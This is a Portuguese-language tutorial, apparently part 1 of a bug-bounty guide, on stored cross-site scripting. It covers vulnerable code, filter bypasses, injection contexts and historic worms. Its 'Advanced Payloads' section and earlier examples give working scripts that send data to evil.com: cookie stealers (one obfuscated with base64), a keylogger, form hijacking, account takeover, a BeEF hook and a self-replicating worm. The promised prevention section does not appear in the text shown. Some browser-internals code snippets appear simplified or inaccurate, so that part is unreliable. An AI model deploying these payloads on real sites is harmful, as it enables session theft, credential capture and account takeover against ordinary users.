# Stored XSS (Persistent Cross-Site Scripting)

**Criticidade**: 🔴 Crítica (CVSS 8.0-10.0)
**Dificuldade**: 🟡 Intermediária
**Bounty Médio**: $2,500 - $25,000 USD

---

## 📚 Índice

1. [Fundamentos e Arquitetura](#fundamentos-e-arquitetura)
2. [DOM e JavaScript Engine Internals](#dom-e-javascript-engine-internals)
3. [Ciclo de Vida do Stored XSS](#ciclo-de-vida-do-stored-xss)
4. [Sanitization Bypass Techniques](#sanitization-bypass-techniques)
5. [Context-Aware Exploitation](#context-aware-exploitation)
6. [Advanced Payloads](#advanced-payloads)
7. [Real-World Case Studies](#real-world-case-studies)
8. [Detection and Prevention](#detection-and-prevention)

---

## 🏗️ Fundamentos e Arquitetura

### Definição Técnica

Stored XSS ocorre quando input malicioso é:
1. **Armazenado** em backend persistente (DB, arquivo, cache)
2. **Recuperado** sem sanitização adequada
3. **Renderizado** no navegador de vítimas
4. **Executado** no contexto do domínio vulnerável

**Modelo de ataque:**

```
Attacker → [POST malicious] → Server Storage (DB)
                                      ↓
Victim → [GET page] → Server → [Retrieve from DB]
                                      ↓
                        Victim Browser ← [Malicious HTML/JS]
                                      ↓
                              [Execute in victim context]
```

### Diferença: Stored vs Reflected

| Aspecto | Stored XSS | Reflected XSS |
|---------|-----------|---------------|
| **Persistência** | Permanente (DB) | Temporária (URL) |
| **Vítimas** | Múltiplas (todos que acessam) | Individual (precisa clicar link) |
| **Severidade** | Maior (worm-like) | Menor (targeted) |
| **Detectabilidade** | Mais difícil | Mais fácil |
| **Exploração** | Passiva | Ativa (social eng) |

### Storage Backends Comuns

**1. Relational Databases (SQL)**

```sql
-- Tabela típica vulnerável
CREATE TABLE comments (
    id INT PRIMARY KEY,
    user_id INT,
    content TEXT,        -- ← Stored XSS aqui!
    created_at TIMESTAMP
);

-- Insert malicioso
INSERT INTO comments (content) VALUES ('<script>alert(1)</script>');

-- Retrieve e renderiza
SELECT content FROM comments WHERE id=1;
-- Output direto no HTML → XSS executado!
```

**2. NoSQL Databases (MongoDB)**

```javascript
// Document vulnerável
db.posts.insert({
    author: "attacker",
    content: "<img src=x onerror=alert(1)>",  // ← XSS
    timestamp: new Date()
});

// Retrieve
db.posts.find({author: "attacker"});
// Se renderizado sem escape → XSS
```

**3. File Storage**

```xml
<!-- comments.xml -->
<comments>
    <comment>
        <author>attacker</author>
        <text><![CDATA[<script>alert(1)</script>]]></text>
    </comment>
</comments>

<!-- Se parsear CDATA sem escape → XSS -->
```

**4. Cache/Redis**

```python
# Cache de comentários
redis.set('comment:123', '<script>steal_cookies()</script>')

# Retrieve
comment = redis.get('comment:123')
return f'<div>{comment}</div>'  # ← Vulnerável!
```

---

## 🌐 DOM e JavaScript Engine Internals

### HTML Parsing e DOM Construction

**Fase 1: Tokenization**

```html
Input: <div>Hello <script>alert(1)</script></div>

Tokens:
[START_TAG: div]
[CHAR: "Hello "]
[START_TAG: script]
[CHAR: "alert(1)"]
[END_TAG: script]
[END_TAG: div]
```

**Fase 2: Tree Construction**

```
Document
 └─ HTMLDivElement
     ├─ TextNode: "Hello "
     └─ HTMLScriptElement
         └─ TextNode: "alert(1)"  ← Será executado!
```

**Critical Point**: Quando `HTMLScriptElement` é inserido no DOM:

```c++
// Chromium: third_party/blink/renderer/core/dom/script_element_base.cc
void ScriptElementBase::DidFinishInsertingNode() {
    // Se é <script> e tem src ou text content
    if (IsScriptElement()) {
        PrepareScript();  // → Compila e executa JavaScript!
    }
}
```

### JavaScript Engine (V8) Execution

**1. Parsing**

```javascript
// Input
alert(document.cookie)

// V8 AST (Abstract Syntax Tree)
CallExpression {
    callee: Identifier("alert"),
    arguments: [
        MemberExpression {
            object: Identifier("document"),
            property: Identifier("cookie")
        }
    ]
}
```

**2. Compilation**

V8 compila JS para bytecode:

```
// Ignition bytecode
LdaGlobal [0]        // Load 'alert' global
LdaNamedProperty [1] // Load 'document.cookie'
CallUndefinedReceiver // Call alert(...)
Return
```

**3. Execution**

```c++
// V8: src/execution/isolate.cc
MaybeHandle<Object> Isolate::RunMicrotasks() {
    // Executa código JavaScript compilado
    // No contexto do document origin
    Handle<JSFunction> microtask = ...;
    Invoke(microtask, ...);  // ← XSS payload executa aqui!
}
```

### Same-Origin Policy (SOP) Context

**Stored XSS bypassa SOP porque executa NO domínio vítima:**

```
Origin: https://vulnerable.com

XSS Payload executado em: https://vulnerable.com
  ↓
Acesso a: document.cookie (same-origin) ✅
Acesso a: localStorage (same-origin) ✅
Acesso a: sessionStorage (same-origin) ✅
AJAX para: https://vulnerable.com/api (same-origin) ✅

vs Reflected XSS via URL:
  ↓
Origin ainda é: https://vulnerable.com
Mas mais suspeito para detectar
```

**Security Context na V8:**

```c++
// v8/src/execution/isolate.h
class Isolate {
    SecurityContext* security_context_;  // Origin do documento

    bool CanAccess(Handle<JSObject> object) {
        // Verifica se current context pode acessar 'object'
        return object->GetCreationContext() == security_context_;
    }
};
```

Stored XSS herda security context do documento → acesso total!

---

## 🔄 Ciclo de Vida do Stored XSS

### Fase 1: Injection (Armazenamento)

**Request malicioso:**

```http
POST /api/comments HTTP/1.1
Host: vulnerable.com
Content-Type: application/json

{
    "post_id": 123,
    "comment": "<img src=x onerror=fetch('//evil.com?c='+document.cookie)>"
}
```

**Backend vulnerável (Node.js exemplo):**

```javascript
// ❌ VULNERÁVEL
app.post('/api/comments', async (req, res) => {
    const { post_id, comment } = req.body;

    // Armazena SEM sanitização!
    await db.query(
        'INSERT INTO comments (post_id, content) VALUES (?, ?)',
        [post_id, comment]
    );

    res.json({ success: true });
});
```

**Database state:**

```sql
mysql> SELECT * FROM comments WHERE id=LAST_INSERT_ID();
+----+---------+------------------------------------------------+
| id | post_id | content                                        |
+----+---------+------------------------------------------------+
|  5 |     123 | <img src=x onerror=fetch('//evil.com?c='...> |
+----+---------+------------------------------------------------+
```

### Fase 2: Storage (Persistência)

**InnoDB Storage Engine (MySQL):**

```
Tablespace: comments.ibd
  ↓
B+ Tree Index on PRIMARY KEY (id)
  ↓
Leaf Node contains:
  [id=5] → [post_id=123, content=<img src=x onerror=...>]
            ↑
            Stored sem encoding/escaping!
```

**Implications:**
- Payload persiste até ser deletado manualmente
- Afeta TODOS os usuários que visualizam
- Difícil de detectar (não está em logs de access)

### Fase 3: Retrieval (Recuperação)

**Vítima acessa página:**

```http
GET /post/123 HTTP/1.1
Host: vulnerable.com
Cookie: session=victim_session_token
```

**Backend processa:**

```javascript
// ❌ VULNERÁVEL
app.get('/post/:id', async (req, res) => {
    const post = await db.query('SELECT * FROM posts WHERE id=?', [req.params.id]);
    const comments = await db.query('SELECT * FROM comments WHERE post_id=?', [req.params.id]);

    // Renderiza SEM escape!
    res.send(`
        <html>
        <body>
            <h1>${post.title}</h1>
            <div>${post.content}</div>
            <div class="comments">
                ${comments.map(c => `<div>${c.content}</div>`).join('')}
            </div>
        </body>
        </html>
    `);
});
```

**HTML response:**

```html
<div class="comments">
    <div><img src=x onerror=fetch('//evil.com?c='+document.cookie)></div>
</div>
```

### Fase 4: Execution (Exploração)

**Browser parsing:**

```
1. HTML parser encontra <img src=x>
2. Tenta carregar imagem de 'x'
3. Falha (x não é URL válido)
4. Dispara evento 'onerror'
5. Executa handler: fetch('//evil.com?c='+document.cookie)
```

**JavaScript execution context:**

```javascript
// Executa no contexto de https://vulnerable.com

// 1. Lê cookie (same-origin)
const cookie = document.cookie;
// "session=victim_session_token; user_id=456"

// 2. Envia para atacante
fetch('https://evil.com?c=' + encodeURIComponent(cookie));
```

**Attacker server log:**

```
[2024-01-15 10:30:45] GET /?c=session%3Dvictim_session_token%3B%20user_id%3D456
[Evil server] Received cookie from victim!
```

### Fase 5: Propagation (Worm Behavior)

**Self-replicating XSS:**

```javascript
// Payload que se auto-replica (XSS Worm)
<script>
// 1. Rouba dados da vítima
fetch('//evil.com?victim=' + document.cookie);

// 2. Posta comentário malicioso em nome da vítima
fetch('/api/comments', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
        post_id: 123,
        comment: document.querySelector('script').outerHTML  // ← Se replica!
    })
});
</script>
```

**Effect:**
- Cada vítima infectada infecta outros
- Crescimento exponencial: 1 → 10 → 100 → 1000...
- Similar a "Samy Worm" (MySpace 2005)

---

## 🛡️ Sanitization Bypass Techniques

### Bypass 1: HTML Entity Encoding

**Filtro ingênuo:**

```javascript
// ❌ Tentativa de "proteção"
function sanitize(input) {
    return input.replace(/<script>/gi, '');
}

// Bypass
'<scr<script>ipt>alert(1)</script>'
// Após replace: '<script>alert(1)</script>'
```

**Por que funciona?**

Replace não é recursivo:
```
<scr<script>ipt>  →  remove '<script>'  →  <script>
```

### Bypass 2: Case Variation

```javascript
// Filtro case-sensitive
function sanitize(input) {
    return input.replace('<script>', '');
}

// Bypasses
'<SCRIPT>alert(1)</SCRIPT>'
'<ScRiPt>alert(1)</ScRiPt>'
'<sCrIpT>alert(1)</sCrIpT>'
```

**HTML é case-insensitive:**

```html
<SCRIPT> === <script> === <ScRiPt>
```

### Bypass 3: Alternative Tags

**Filtro bloqueia `<script>`:**

```javascript
function sanitize(input) {
    return input.replace(/<script.*?>.*?<\/script>/gi, '');
}
```

**Bypasses usando outras tags:**

```html
<!-- Event handlers -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe onload=alert(1)>
<input onfocus=alert(1) autofocus>

<!-- JavaScript protocol -->
<a href="javascript:alert(1)">Click</a>
<form action="javascript:alert(1)"><input type=submit></form>

<!-- Meta refresh -->
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">

<!-- Link stylesheet -->
<link rel="stylesheet" href="javascript:alert(1)">
```

### Bypass 4: Encoding Variations

**Filtro bloqueia strings óbvias:**

```javascript
function sanitize(input) {
    if (input.includes('alert') || input.includes('cookie')) {
        throw new Error('Blocked');
    }
    return input;
}
```

**Bypasses:**

```javascript
// Unicode escaping
<script>\u0061lert(1)</script>  // \u0061 = 'a'

// Hex escaping
<script>eval('\x61\x6c\x65\x72\x74(1)')</script>

// String concatenation
<script>window['al'+'ert'](1)</script>

// Computed property
<script>window['ale'+'rt'](document['cook'+'ie'])</script>

// Base64
<script>eval(atob('YWxlcnQoMSk='))</script>  // alert(1)

// fromCharCode
<script>String.fromCharCode(97,108,101,114,116,40,49,41)</script>
```

### Bypass 5: DOM Clobbering

**Exploita redefinição de DOM globals:**

```html
<!-- Define 'script' como elemento HTML -->
<form name="script"></form>

<!-- Agora window.script é o <form>, não a função! -->
<script>
// Filtro verifica: if (typeof script === 'function')
// Mas foi clobbered! typeof script === 'object'

// Bypass usando nome diferente
window['scr'+'ipt'] = eval;  // Restaura função
script('alert(1)');  // ← Executado!
</script>
```

### Bypass 6: Template Literals

```javascript
// ES6 tagged templates
<script>
alert`1`;  // Equivalente a alert(1)
eval`alert\x281\x29`;  // alert(1)
</script>
```

### Bypass 7: CSP Bypass via JSONP

**Se CSP permite domínio específico:**

```html
<script src="https://trusted-cdn.com/jsonp?callback=alert"></script>

<!-- Resposta do servidor:
alert({"data": "..."});
// ← 'alert' é executado como função!
-->
```

---

## 🎯 Context-Aware Exploitation

### Context 1: Inside HTML Tag

**Vulnerable code:**

```html
<input type="text" value="USER_INPUT">
```

**Exploitation:**

```
Input: "><script>alert(1)</script>
Output: <input type="text" value=""><script>alert(1)</script>">
                                     ↑ Injected script
```

### Context 2: Inside Attribute

**Vulnerable code:**

```html
<img src="user_avatar.jpg" alt="USER_INPUT">
```

**Exploitation:**

```
Input: " onerror="alert(1)
Output: <img src="user_avatar.jpg" alt="" onerror="alert(1)">
                                          ↑ Injected handler
```

### Context 3: Inside JavaScript String

**Vulnerable code:**

```html
<script>
var username = "USER_INPUT";
</script>
```

**Exploitation:**

```javascript
Input: "; alert(1); //
Output: var username = ""; alert(1); //";
                          ↑ Breaks out of string
```

### Context 4: Inside JavaScript Template Literal

**Vulnerable code:**

```javascript
<script>
const msg = `Hello ${USER_INPUT}!`;
</script>
```

**Exploitation:**

```javascript
Input: ${alert(1)}
Output: const msg = `Hello ${alert(1)}!`;
                             ↑ Expression injection
```

### Context 5: Inside HTML Comment

**Vulnerable code:**

```html
<!-- Comment: USER_INPUT -->
```

**Exploitation:**

```html
Input: --><script>alert(1)</script><!--
Output: <!-- Comment: --><script>alert(1)</script><!-- -->
                        ↑ Breaks out of comment
```

### Context 6: Inside CSS

**Vulnerable code:**

```html
<style>
.user-theme { background-color: USER_INPUT; }
</style>
```

**Exploitation:**

```css
Input: red;}</style><script>alert(1)</script><style>
Output:
.user-theme { background-color: red;}</style><script>alert(1)</script><style>; }
                                             ↑ Breaks out of CSS
```

**Alternative (IE-specific):**

```css
Input: expression(alert(1))
Output: .user-theme { background-color: expression(alert(1)); }
                                        ↑ IE executa JS!
```

---

## 💣 Advanced Payloads

### Payload 1: Cookie Stealer

```html
<script>
fetch('https://evil.com/log?c=' + encodeURIComponent(document.cookie));
</script>
```

**Improved version (evasive):**

```html
<img src=x onerror="
    (new Image()).src='//'+atob('ZXZpbC5jb20=')+'?c='+btoa(document.cookie)
">
<!-- atob('ZXZpbC5jb20=') = 'evil.com' (obfuscated) -->
```

### Payload 2: Keylogger

```html
<script>
document.onkeypress = function(e) {
    fetch('https://evil.com/log?key=' + e.key);
};
</script>
```

**Improved (captures form data):**

```html
<script>
let buffer = '';
document.addEventListener('keypress', e => {
    buffer += e.key;
    if (buffer.length > 50 || e.key === 'Enter') {
        navigator.sendBeacon('https://evil.com/log', buffer);
        buffer = '';
    }
});
</script>
```

### Payload 3: Form Hijacking

```html
<script>
document.querySelectorAll('form').forEach(form => {
    form.addEventListener('submit', e => {
        e.preventDefault();
        const data = new FormData(form);
        fetch('https://evil.com/phish', {
            method: 'POST',
            body: data
        }).then(() => form.submit());  // Submit original após roubar
    });
});
</script>
```

### Payload 4: Session Hijacking + Account Takeover

```html
<script>
// 1. Rouba session token
const session = document.cookie;

// 2. Muda email da conta
fetch('/api/account/email', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({email: 'attacker@evil.com'})
});

// 3. Pede reset de senha
fetch('/api/account/reset-password', {method: 'POST'});

// 4. Envia confirmação para atacante
fetch('https://evil.com/takeover?session=' + session);
</script>
```

### Payload 5: BeEF Hook

```html
<script src="https://evil.com/beef/hook.js"></script>

<!-- BeEF permite controle remoto do browser -->
```

### Payload 6: Self-Replicating Worm

```html
<script id="worm">
(async () => {
    // Envia dados para atacante
    await fetch('//evil.com?victim=' + document.cookie);

    // Replica: posta este script em todos os posts
    const posts = await fetch('/api/posts').then(r => r.json());

    for (const post of posts) {
        await fetch(`/api/posts/${post.id}/comment`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                comment: document.getElementById('worm').outerHTML
            })
        });
    }
})();
</script>
```

---

## 🔥 Real-World Case Studies

### Case 1: MySpace Samy Worm (2005)

**Vulnerability**: Stored XSS em profile

**Payload** (simplificado):

```javascript
<div id="mycode" style="background:url('java
script:eval(document.all.mycode.expr)')" expr="
var B=String.fromCharCode(60,47,68,73,86,62);
document.body.innerHTML+=B+'<script src=http://samy.pl/js.js></script>';
">
```

**Mechanism**:
- CSS `background:url()` com `javascript:` protocol
- `eval()` executa código
- Adiciona atacante como friend
- Se replica no profile da vítima

**Impact**: 1 milhão de infectados em 20 horas

**Bounty**: N/A (processado criminalmente)

### Case 2: TweetDeck XSS Worm (2014)

**Vulnerability**: Stored XSS em tweets

**Payload**:

```html
<script class="xss">
$('.xss').parents().eq(1).find('a').eq(1).click();
$('[data-action=retweet]').click();
alert('XSS');
</script>
```

**Mechanism**:
- jQuery selector manipula DOM
- Auto-retweet do payload
- Cada retweet infecta followers

**Impact**: 38,000+ retweets em minutos

**Fix**: Twitter suspendeu TweetDeck temporariamente

### Case 3: Facebook Messenger Stored XSS (2018)

**Vulnerability**: Stored XSS via file upload (SVG)

**Payload** (evil.svg):

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    alert(document.cookie);
  </script>
</svg>
```

**Mechanism**:
- Upload SVG como "imagem"
- SVG renderizado inline
- `<script>` dentro de SVG executado

**Impact**: Acesso a mensagens de qualquer usuário

**Bounty**: $20,000 USD

---

**Continua em próxima seção...**

**Última atualização**: 2024
**Versão**: 1.0 (Part 1/2)
